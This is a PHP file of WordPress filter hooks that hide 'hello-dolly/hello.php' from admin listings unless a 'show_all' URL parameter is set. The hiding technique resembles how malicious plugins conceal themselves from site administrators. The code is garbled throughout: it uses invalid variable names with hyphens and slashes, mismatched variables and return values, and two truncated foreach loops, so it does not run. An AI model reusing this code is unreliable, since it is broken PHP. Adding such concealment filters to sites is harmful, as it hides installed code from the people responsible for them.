<?php
add_filter(
	'all_wp-content',
	function ( $wp-content ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content as $hiddenwp-content ) {
			unset( $wp-content[ $hiddenwp-content] );
			}
		}
		return $wp-content;
	}
);
add_filter(
	'all_wp-content/mu-plugins',
	function ( $wp-content/mu-plugins ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/mu-plugins = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content/mu-plugins as $hiddenwp-content/mu-plugins ) {
			unset( $fonts[ $hiddenwp-content/mu-plugins] );
			}
		}
		return $wp-content/fonts;
	}
);
add_filter(
	'all_wp-content/fonts',
	function ( $wp-content/fonts ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/fonts = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content/fonts as $hiddenwp-content/fonts ) {
			unset( $fonts[ $hiddenwp-content/font] );
			}
		}
		return $wp-content/fonts;
	}
);
add_filter(
	'all_wp-content/plugins',
	function ( $wp-content/plugins ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/plugins = [
				'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content/plugins as $hiddenwp-content/plugins ) {
			unset( $wp-content/plugins[ $hiddenwp-content/plugin] );
			}
		}
		return $wp-content/plugins;
	}
);
add_filter(
	'all_wp-content/themes',
	function ( themes ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/themes = [
			'hello-dolly/hello.php',
			'hello.php',
			];themes as $hiddenwp-content/themes ) {
			unset( $wp-content/themes[ $hiddenwp-content/theme ] );
			}
		}
		return $wp-content/themes;
	}
);
add_filter(
	'all_wp-content/uploads',
	function ( wp-content/uploads ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/uploads = [
			'hello-dolly/hello.php',
			'hello.php',
			];wp-content/uploads as $hiddenwp-content/uploads ) {
			unset( $wp-content/uploads[ $hiddenwp-content/upload] );
			}
		}
		return $wp-content/uploads;
	}
);